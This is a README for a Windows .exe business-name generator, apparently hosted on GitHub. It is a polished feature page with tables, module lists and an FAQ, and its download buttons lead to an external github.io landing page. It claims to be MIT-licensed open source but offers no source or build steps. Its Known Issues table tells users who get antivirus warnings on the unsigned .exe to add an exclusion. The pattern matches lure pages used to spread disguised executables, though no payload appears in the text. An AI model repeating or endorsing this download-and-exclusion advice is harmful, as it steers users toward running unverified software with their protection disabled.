<div align="center">
<img src="assets/banner.png" width="100%" alt="AI Business Name Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-EA580C?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-7C3AED?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=2563EB&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Ai+Business+Name+Forge;%E2%AD%90+Ready+for+Windows;%F0%9F%92%A1+No+Limits;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**Generate a hundred viable business names in the time it takes to brew coffee — brandable, checkable, and ready to pitch.**
Forge turns a one-line description of what you're building into ranked, domain-aware name candidates with taglines, tone tags, and availability signals.

</div>

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [What is the AI Business Name Generator?](#-what-is-the-ai-business-name-generator)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Quick Start](#-quick-start)
- [Key Features](#-key-features)
- [Core Generation Modules](#-1--core-generation-modules)
- [Branding & Positioning Modules](#-2--branding--positioning-modules)
- [Availability & Legal Modules](#-3--availability--legal-modules)
- [Workflow & Export Modules](#-4--workflow--export-modules)
- [AI Reasoning & Tuning Modules](#-5--ai-reasoning--tuning-modules)
- [Comparison](#-comparison)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Known Issues](#-known-issues)
- [Tips for Best Results](#-tips-for-best-results)
- [Usage Guidelines](#-usage-guidelines)
- [All Modules Status](#-all-modules-status)
- [FAQ](#-faq)

---

## 📦 Overview

| Category | Details |
|---|---|
| Product type | Windows desktop app (`.exe`, portable + installer) |
| Core function | AI-driven business name generation, ranking, and brand-fit scoring |
| Input | 1–3 sentence business description, industry, tone, optional keywords |
| Output | Ranked name list, taglines, domain hints, tone tags, CSV/JSON export |
| Engine | Local model runtime + optional cloud pass for deep semantic scoring |
| Typical run | 50–200 candidates in under 40 seconds on a mid-range laptop |
| Offline mode | Yes — generation runs fully offline; availability checks are optional |
| License | MIT — free to use, modify, and redistribute |

Forge is a focused desktop tool for founders, indie hackers, and brand consultants who need a name that actually fits the business — not a random word mash. It reads your description, understands the category and emotional register you're after, and produces candidates scored against memorability, pronounceability, and domain plausibility.

---

## 🧩 What is the AI Business Name Generator?

| Term | Explanation |
|---|---|
| **Candidate** | A single generated business name, with metadata attached. |
| **Score** | Composite rank (0–100) from memorability, brand-fit, and length heuristics. |
| **Tone tag** | Emotional register of a name — *playful*, *serious*, *premium*, *technical*, *warm*. |
| **Domain hint** | Plausible TLD/domain shape for a candidate (e.g., `name.co`, `getname.com`). |
| **Seed** | The short description you feed Forge — the input that drives generation. |
| **Batch** | A single generation run producing N candidates with shared settings. |
| **Lock** | Pinning a candidate so it survives re-rolls and appears in every export. |

Feed it a seed, pick a tone, hit generate. Forge returns a ranked list you can sort, pin, tag, and export. No account, no cloud dependency required.

- **Founder-first workflow** — built for the "I need a name by Monday" reality.
- **Tone-aware** — names match the register you're actually pitching in.
- **Domain-plausibility baked in** — avoid names that will never resolve to a real domain.
- **Fully local** — your business idea never leaves your machine unless you enable cloud scoring.
- **Batch comparison** — run multiple seeds side by side and diff results.

---

## 🩹 The Problem

- Generic name generators spit out **SEO-bait word-salad** — "Brandlyfy", "NexaVibe", "Synerlytic" — none of which a real customer would say out loud.
- Most tools ignore **tone**. A name that works for a serious B2B fintech is wrong for a playful consumer app.
- **Domain availability** is an afterthought, so half the generated list is already taken.
- **No ranking you can trust** — output arrives as an unsorted dump of 500 names that all sound the same.
- **No batch workflow** — comparing three different positioning directions means running the tool three times and manually diffing.
- **Cloud-only tools** leak your business idea to a third-party inference service before you've even validated the concept.
- **No taglines or positioning context** — you get a name and nothing else, forcing you to start the branding work from zero.

---

## 🛠️ The Solution

| Problem | Solution |
|---|---|
| Word-salad names | Semantic-fit scoring rewards pronounceability and real-word roots over random syllables. |
| Tone ignored | Explicit tone selector (playful → serious → premium) constrains the generation space. |
| Domain afterthought | Domain-plausibility heuristic flags names likely to be unresolvable. |
| No trustworthy ranking | Composite score with sortable columns and per-metric breakdowns. |
| No batch workflow | Multi-seed batches with diff view and shared lock list. |
| Cloud privacy leak | Offline generation by default; cloud scoring is opt-in per batch. |
| No positioning context | Each candidate ships with suggested taglines and tone tags. |

---

## ⚡ Quick Start

1. 🧷 **Grab the release** — download the `.exe` from the project landing page.
2. 📂 **Extract** the archive to a folder you control (e.g., `C:\Tools\NameForge`). Portable build — no installer required.
3. ▶️ **Launch** the `.exe`. First run initialises a local model cache (~480 MB) next to the executable.
4. 🌱 **Seed the generator** — type one to three sentences describing your business, pick a tone, choose a candidate count.
5. 🔁 **Generate, sort, pin, export.** Pin the ones you love, export as CSV or JSON, and move on.

### <div align="center">
  <a href="https://MillipedeMultiplexer.github.io/ai-business-name-forge/">
    <img src="https://img.shields.io/badge/GET-AI_business_name_2026-0891B2?style=flat-square&logo=windows&logoColor=white&labelColor=0E7490" width="620" alt="GET AI business name 2026"/>
  </a>
</div>

---

## 🎯 Key Features

| Feature | Description | Benefit |
|---|---|---|
| Semantic seed parsing | Reads a natural-language description and extracts category, audience, and register. | No configuration overhead — just describe the business. |
| Tone-constrained generation | Five tone presets from playful to premium. | Names actually match your pitch deck. |
| Composite scoring | Memorability + pronounceability + length + brand-fit in one rank. | Trust the top of the list. |
| Domain plausibility hints | Flags candidates that are unlikely to resolve to a live domain. | Skip the dead ends. |
| Batch mode | Run up to 10 seeds in parallel with independent settings. | Compare positioning directions side by side. |
| Lock & pin | Pinned candidates survive re-rolls and appear in every export. | Keep your shortlist stable while iterating. |
| Taglines per candidate | Each name arrives with 2–3 suggested taglines. | Start positioning immediately. |
| CSV / JSON export | Structured exports for spreadsheets or downstream pipelines. | Feed directly into your ops stack. |
| Offline-first engine | Full generation works without network access. | Ideas stay on your machine. |
| Cloud deep-score (optional) | Opt-in pass for deeper semantic scoring on premium tiers. | Extra signal when you want it. |
| Multi-language seeds | Accepts English, Spanish, Italian, Japanese, Arabic seed descriptions. | Global founders, one tool. |
| Dark/light UI | System-aware theming. | Long sessions without eye strain. |

---

## 🧠 1 — Core Generation Modules

1. **Seed Interpreter** — parses your description into category, audience, size, and register signals.
2. **Lexical Root Engine** — pulls plausible English + Latin + Greek roots matched against the interpreted category.
3. **Compound Forge** — combines roots into compound names with syllable constraints.
4. **Neologism Forge** — generates invented-but-pronounceable words (the "Lyft / Hulu" shape).
5. **Real-Word Reclaimer** — surfaces real dictionary words that fit the category and are plausibly brandable.
6. **Proper-Noun Adapter** — generates names from place, myth, and historical references when tone calls for it.
7. **Abbreviation Forge** — builds clean acronyms from your own description keywords.
8. **Length Governor** — hard cap on syllables and characters per candidate, user-configurable.

---

## 🎨 2 — Branding & Positioning Modules

1. **Tone Selector** — playful / warm / serious / premium / technical. Drives generation weights.
2. **Tagline Suggester** — generates 2–3 positioning taglines per candidate.
3. **Tone Tag Labeller** — auto-labels every candidate with its dominant register.
4. **Brand Fit Scorer** — scores each candidate against a description-derived ideal profile.
5. **Silhouette Check** — flags names that look confusingly similar to existing famous brands.
6. **Vowel Flow Analyzer** — measures mouth-feel and flags awkward consonant clusters.

---

## ⚖️ 3 — Availability & Legal Modules

1. **Domain Plausibility Heuristic** — flags candidates unlikely to resolve on `.com`, `.io`, `.co`, `.ai`.
2. **Handle Shape Check** — suggests plausible @handle shapes for social platforms.
3. **Trademark Risk Hint** — local heuristic flagging candidates that strongly resemble well-known marks (not legal advice).
4. **Similar-Name Radar** — surfaces candidates with high phonetic overlap to each other so you can prune near-duplicates.
5. **Reserved-Term Filter** — removes candidates containing phrases the tool knows are commonly blocked.

---

## 🗂️ 4 — Workflow & Export Modules

1. **Batch Runner** — up to 10 seeds in parallel, independent settings per batch.
2. **Lock & Pin** — pinned candidates persist across re-rolls and exports.
3. **Diff View** — compare two batches side by side, highlight overlap and uniques.
4. **CSV Export** — spreadsheet-ready with all metadata columns.
5. **JSON Export** — structured export for downstream pipelines.
6. **Shortlist Export** — pinned-only export for sending to a co-founder or client.
7. **Session Save / Restore** — persist an entire workspace (seeds, candidates, locks, notes).
8. **Notes Column** — per-candidate free-text notes, exported with the rest.

---

## 🧬 5 — AI Reasoning & Tuning Modules

1. **Local Model Runtime** — the generation engine, running fully offline by default.
2. **Cloud Deep-Score (opt-in)** — optional pass for higher-fidelity semantic scoring.
3. **Temperature Dial** — user-facing creativity slider (safe → wild).
4. **Root-Source Weighting** — bias generation toward real words, invented words, or balanced.
5. **Category Presets** — one-click presets for common industries (SaaS, fintech, consumer, dev tools, agencies, e-commerce).
6. **Seed Refinement Assistant** — suggests how to sharpen a weak seed description.

---

## 🆚 Comparison

| Aspect | Generic Web Generators | This Tool |
|---|---|---|
| Generation quality | Random word mash | Semantic-fit scored candidates |
| Tone awareness | None | Five tone presets |
| Domain plausibility | Usually ignored | Built-in heuristic |
| Ranking | Unsorted dump | Composite score with breakdown |
| Batch workflow | Re-run the site | Multi-seed batches with diff |
| Privacy | Cloud-only, idea leaves machine | Offline-first, cloud opt-in |
| Taglines | Not provided | 2–3 per candidate |
| Export | Copy-paste | CSV / JSON / shortlist |
| Price model | Subscription, per-seat | Free, MIT-licensed |
| Platform | Browser | Windows desktop `.exe` |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 8 GB+ |
| Disk | 1.2 GB free (incl. model cache) | 2 GB+ free |
| GPU | Not required | CUDA-capable for faster local scoring |
| Network | Not required for generation | Required for optional cloud deep-score |
| Runtime | .NET 6 desktop runtime | Bundled in installer build |

---

## 📂 Installation

1. **Download the release archive.** Grab the `.exe` from the project landing page — you'll get either the portable ZIP or the installer, depending on which build you chose.
2. **Extract or run the installer.**
   - Portable build: extract the ZIP to a folder you control (e.g., `C:\Tools\NameForge`). No admin rights required.
   - Installer build: run the `.exe` and follow the wizard. Default path is `%LOCALAPPDATA%\NameForge`.
3. **First launch.** On first run the app writes a local model cache (~480 MB) next to the executable. Allow 30–60 seconds for the initial unpack. No account, no login, no telemetry.

### <p align="center">
  <a href="https://MillipedeMultiplexer.github.io/ai-business-name-forge/">
    <img src="https://img.shields.io/badge/GET-AI_business_name_2026-0D9488?style=flat-square&logo=github&logoColor=white&labelColor=0F766E" width="620" alt="GET AI business name 2026"/>
  </a>
</p>

---

## 🔧 Known Issues

| Issue | Fix |
|---|---|
| First launch sluggish on HDD | Move the app folder to an SSD, or wait for the one-time cache unpack to complete. |
| Cloud deep-score fails silently | Check network; the app falls back to local scoring after 8 seconds. |
| Domain plausibility hints seem conservative | Disable the heuristic in **Settings → Generation → Domain Hints** for a raw list. |
| CSV export opens with garbled characters in Excel EU locales | Use `Import from Text` in Excel, or export as JSON. |
| High candidate counts (>500) freeze the UI briefly | Lower the candidate count or enable **Fast Mode** in Settings. |
| Antivirus flags the portable `.exe` on first run | Add an exclusion — unsigned portable binaries are commonly flagged. |

---

## 💡 Tips for Best Results

- Write the seed like you'd pitch it to a friend, not like an SEO keyword list.
- Pick a tone and stick with it for a batch — mixing tones in one run dilutes the signal.
- Generate 100+ candidates, then trim hard. Most strong names appear in the top 30.
- Use **Lock & Pin** aggressively — re-rolls are for exploration, locks are for your shortlist.
- Run two batches with different tones and use **Diff View** to find names that survive both.
- Keep seeds under 60 words. Longer seeds over-constrain the model.
- If nothing lands, sharpen the seed before you touch the temperature dial.

---

## 🚦 Usage Guidelines

| Allowed | Not allowed |
|---|---|
| Generating names for your own business or your clients' businesses. | Generating names intended to impersonate an existing brand. |
| Using the tool in a commercial branding workflow. | Reselling generated names as a service without adding value. |
| Modifying the source and redistributing under the same license. | Bundling the tool inside paid products without attribution. |
| Running multiple batches for the same project. | Using the tool to mass-produce spam or low-quality directories. |
| Exporting and sharing results with co-founders or clients. | Removing the LICENSE file from redistributed builds. |

---

## 📊 All Modules Status

| Module | Status | Description |
|---|---|---|
| Seed Interpreter | ✅ Working | Parses description into category + audience + register. |
| Lexical Root Engine | ✅ Working | Root-source pool for real-word generation. |
| Compound Forge | ✅ Working | Syllable-constrained compound name construction. |
| Neologism Forge | ✅ Working | Invented-but-pronounceable candidates. |
| Real-Word Reclaimer | ✅ Working | Dictionary-word brand candidates. |
| Proper-Noun Adapter | ✅ Working | Place / myth / historical name generation. |
| Abbreviation Forge | ✅ Working | Clean acronyms from seed keywords. |
| Length Governor | ✅ Working | User-configurable syllable / character caps. |
| Tone Selector | ✅ Working | Five tone presets driving generation weights. |
| Tagline Suggester | ✅ Working | 2–3 taglines per candidate. |
| Tone Tag Labeller | ✅ Working | Auto-labels dominant register. |
| Brand Fit Scorer | ✅ Working | Composite brand-fit score. |
| Silhouette Check | ✅ Working | Similarity flag against well-known brands. |
| Vowel Flow Analyzer | ✅ Working | Mouth-feel / consonant-cluster heuristic. |
| Domain Plausibility | ✅ Working | Heuristic domain-resolvability hint. |
| Handle Shape Check | ✅ Working | Social handle shape suggestions. |
| Trademark Risk Hint | ✅ Working | Local heuristic resemblance flag (not legal advice). |
| Similar-Name Radar | ✅ Working | Phonetic-overlap detection inside a batch. |
| Reserved-Term Filter | ✅ Working | Removes commonly-blocked phrases. |
| Batch Runner | ✅ Working | Up to 10 parallel seeds with per-batch settings. |
| Lock & Pin | ✅ Working | Persistent pinned candidates across re-rolls. |
| Diff View | ✅ Working | Side-by-side batch comparison. |
| CSV Export | ✅ Working | Spreadsheet-ready structured export. |
| JSON Export | ✅ Working | Structured export for downstream pipelines. |
| Shortlist Export | ✅ Working | Pinned-only export for sharing. |
| Session Save / Restore | ✅ Working | Full workspace persistence. |
| Notes Column | ✅ Working | Per-candidate free-text notes. |
| Local Model Runtime | ✅ Working | Offline generation engine. |
| Cloud Deep-Score | ✅ Working (opt-in) | Higher-fidelity semantic scoring when enabled. |
| Temperature Dial | ✅ Working | Creativity slider from safe to wild. |
| Root-Source Weighting | ✅ Working | Bias real-word vs invented-word generation. |
| Category Presets | ✅ Working | One-click industry presets. |
| Seed Refinement Assistant | ✅ Working | Suggests sharpening for weak seeds. |

---

## ❓ FAQ

**1. Do I need an account or internet connection?**
No. Forge is offline-first. Generation, scoring, and export all work without network access. The only feature that needs the internet is the optional cloud deep-score pass, which you enable per batch.

**2. Is this a subscription or a one-time thing?**
Free and MIT-licensed. No subscription, no seat licensing, no forced cloud calls. You download the `.exe`, extract it, run it. That's the whole relationship.

**3. How many names can it generate per run?**
Default is 100 candidates per seed. You can push it to 500 per batch, but batches over 250 will feel slower on the UI. Fast Mode helps with large runs.

**4. Does it check whether a domain is actually available?**
No. It gives a **plausibility hint** — a signal that a name is likely or unlikely to resolve on common TLDs. Actual registration checks belong to a registrar, not to a name generator.

**5. Can I use the generated names commercially?**
Yes. Names are yours. The tool is a generator, not a broker. What you do with the output is your call — but do your own trademark diligence for anything you plan to build on.

**6. Is the "trademark risk hint" legal advice?**
Absolutely not. It's a local heuristic that flags names strongly resembling well-known marks. It exists to save you time on obvious dead ends, not to replace a lawyer.

**7. Can I run it on macOS or Linux?**
Not officially. This release targets Windows 10 / 11. Source is open, so a port is technically possible, but the shipped `.exe` is Windows-only.

**8. Does the portable build leave files behind?**
The model cache and workspace files live next to the executable. Delete the folder, and everything is gone. No registry entries, no user-profile writes.

**9. What's the difference between local scoring and cloud deep-score?**
Local scoring uses the bundled offline model and is instant. Cloud deep-score sends your seed and candidates to a remote inference endpoint for higher-fidelity scoring — useful when you need the extra signal, and entirely optional.

**10. Where do I send bugs or feature requests?**
Open an issue on the repository with your seed description (redact anything sensitive), the tone preset, and the batch size. Reproducible seeds make fixes fast.

---

Forge exists because naming a business shouldn't feel like guessing at a slot machine. It's a desktop tool, it works offline, and it respects the fact that the name is the first thing your customers will actually say. Name the next move. The forge is open.
